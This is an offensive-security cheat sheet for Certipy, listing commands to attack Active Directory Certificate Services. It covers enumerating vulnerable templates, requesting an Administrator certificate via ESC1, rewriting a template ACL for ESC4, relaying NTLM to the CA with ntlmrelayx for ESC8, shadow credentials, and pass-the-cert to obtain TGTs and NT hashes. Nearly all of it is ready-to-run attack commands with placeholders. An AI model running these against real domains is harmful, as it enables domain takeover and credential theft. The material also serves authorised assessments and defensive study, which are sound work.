# 03.10 Certipy

> AD Certificate Services attack toolkit — ESC1 through ESC15, request, save, auth, relay, shadow cred chain.

## Overview

Certipy is the canonical ADCS attack tool. Enumerates vulnerable templates (ESC1-15), requests certs, authenticates with certs (PKINIT), and chains with shadow credentials. Replaces older PowerShell tooling for cross-platform ADCS work. Critical for any AD assessment — ADCS misconfig is one of the most common DA-escalation paths.

## Steps

- **Step 1** - Install via pipx.
- **Step 2** - Enumerate ADCS templates first.
- **Step 3** - Identify a vulnerable ESC condition and exploit.

## Commands

### Install

```bash
pipx install certipy-ad
# verify
certipy-ad --help
```

### Enumerate (find vulns)

```bash
certipy-ad find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC-IP> -vulnerable -stdout
certipy-ad find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC-IP> -json -output adcs.json
```

### ESC1 — Enrollee Supplies Subject

```bash
# Request a cert as Administrator using a vulnerable template
certipy-ad req -u <USER>@<DOMAIN> -p <PASS> -ca <CA-NAME> -target <CA-FQDN> -template <VULN-TEMPLATE> -upn Administrator@<DOMAIN>
# Auth with the cert to get TGT
certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP>
```

### ESC4 — Modify template ACL

```bash
# Make template vulnerable, then exploit, then restore
certipy-ad template -u <USER>@<DOMAIN> -p <PASS> -template <TARGET-TEMPLATE> -save-old
# Now template allows arbitrary SAN — exploit like ESC1
certipy-ad req -u <USER>@<DOMAIN> -p <PASS> -ca <CA-NAME> -target <CA-FQDN> -template <TARGET-TEMPLATE> -upn Administrator@<DOMAIN>
# Restore
certipy-ad template -u <USER>@<DOMAIN> -p <PASS> -template <TARGET-TEMPLATE> -configuration <BACKUP-FILE>
```

### ESC8 — NTLM Relay to ADCS HTTP

```bash
# Set up Responder + ntlmrelayx → Certipy auths with relayed creds
impacket-ntlmrelayx -t http://<CA-FQDN>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
# Trigger NTLM auth from a DC (PetitPotam/PrintNightmare/etc.)
# Captured cert lets you auth as DC$
```

### Shadow credentials chain

```bash
certipy-ad shadow auto -u <USER>@<DOMAIN> -p <PASS> -account <TARGET-USER>
# Sets msDS-KeyCredentialLink, requests TGT, optionally cleans up
```

### PassTheCert

```bash
certipy-ad auth -pfx <USER>.pfx -dc-ip <DC-IP>
# Returns TGT and NT hash for the user
```
